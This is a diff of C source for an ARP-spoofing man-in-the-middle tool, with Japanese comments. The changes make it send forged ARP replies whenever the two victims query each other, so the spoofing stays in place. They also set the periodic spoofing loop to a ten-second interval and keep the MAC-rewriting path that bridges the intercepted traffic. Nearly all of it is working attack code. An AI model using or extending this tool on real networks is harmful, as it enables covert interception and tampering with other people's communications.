@@ -69,8 +69,10 @@ int proccessMITMPacket(int deviceNo,u_char *data,int size, in_addr_t send_ip,u_c
         ptr+=sizeof(struct ether_arp);
         lest-=sizeof(struct ether_arp);
 
+        int isRequest = 0;
         if(arp->arp_op==htons(ARPOP_REQUEST)){
             DebugPrintf("[%d]recv:ARP REQUEST:%dbytes\n",deviceNo,size);
+            isRequest = 1;
             //Ip2Mac(deviceNo,*(in_addr_t *)arp->arp_spa,arp->arp_sha);
         }
         if(arp->arp_op==htons(ARPOP_REPLY)){
@@ -82,9 +84,10 @@ int proccessMITMPacket(int deviceNo,u_char *data,int size, in_addr_t send_ip,u_c
         int isAtoB = *(in_addr_t *)arp->arp_spa == send_ip && *(in_addr_t *)arp->arp_tpa == rec_ip;
         int isBtoA = *(in_addr_t *)arp->arp_spa == rec_ip && *(in_addr_t *)arp->arp_tpa == send_ip;
         if(isAtoB || isBtoA){
-            //AとBの間のARPパケットなので、無視する。（仲介してあげない）
             DebugPrintf("[%d]recv:MITM ARP PACKET:%dbytes\n",deviceNo,size);
-            return (-1);
+            //AとBの間のARPパケットなので、仲介はせず、スプーフィング継続のための偽のARPリプライを送る
+            if(isRequest) SendArpPacket(0, Device[deviceNo].soc, *(in_addr_t *)arp->arp_spa, arp->arp_sha, *(in_addr_t *)arp->arp_tpa, Device[deviceNo].hwaddr); 
+            return (-1);    //書き換えてブリッジする必要がないので-1を返す(ARPリプライを返してるから。判断する関数の中で通信しちゃうとか、設計としてはまずそう)
         }
     }
     else if(ntohs(eh->ether_type)==ETHERTYPE_IP){
@@ -121,7 +124,7 @@ int proccessMITMPacket(int deviceNo,u_char *data,int size, in_addr_t send_ip,u_c
             //送信元MACアドレスは自分
             for(ii=0; ii<6; ii++) eh->ether_shost[ii] = Device[deviceNo].hwaddr[ii];
             //IPアドレスは、送信元が端末A、宛先が端末Bになってるので変える必要はない
-            return(1);
+            return(1);  //書き換える必要があるパケット=trueなので1を返す
         }
     }
 
@@ -189,10 +192,11 @@ struct argArp{
 
 void *arpspoof(void *p){
     struct argArp  *arg = (struct argArp *)p;
+    int intervalSec = 10;
     while(1){
         SendArpPacket(1, arg->soc, arg->ip_d, arg->mac_d, arg->ip_s, arg->mac_s);
-        SendArpPacket(0, arg->soc, arg->ip_s, arg->mac_s, arg->ip_d, arg->mac_d);
-        usleep(0.01*1000000);
+        //SendArpPacket(0, arg->soc, arg->ip_s, arg->mac_s, arg->ip_d, arg->mac_d);
+        usleep(intervalSec * 1000000);
     }
 
     return (NULL);
